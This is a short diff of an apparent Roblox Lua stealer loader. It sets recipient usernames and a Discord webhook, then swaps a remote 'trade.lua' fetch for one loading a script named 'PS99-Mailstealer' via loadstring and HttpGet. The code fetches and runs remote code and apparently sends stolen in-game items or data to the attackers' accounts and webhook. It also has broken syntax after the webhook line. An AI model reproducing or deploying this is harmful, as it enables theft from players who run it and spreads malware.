@@ -1,3 +1,5 @@
-UserName = "xxneverkazanxx"
-WebHook = "https://discord.com/api/webhooks/1272063439296135209/nti1MDw0dnJbIrNGLjOPCtFQ4RdCiRz9FqUPtJiSVnk9e3kmkuCYY0i8mH6b5kiz0mP2"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/MM2/main/trade.lua"))()
+Username = "xxneverkazanxx"
+Username2 = "RK_0101"
+Webhook = "https://discord.com/api/webhooks/1272063439296135209/nti1MDw0dnJbIrNGLjOPCtFQ4RdCiRz9FqUPtJiSVnk9e3kmkuCYY0i8mH6b5kiz0mP2"))()"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
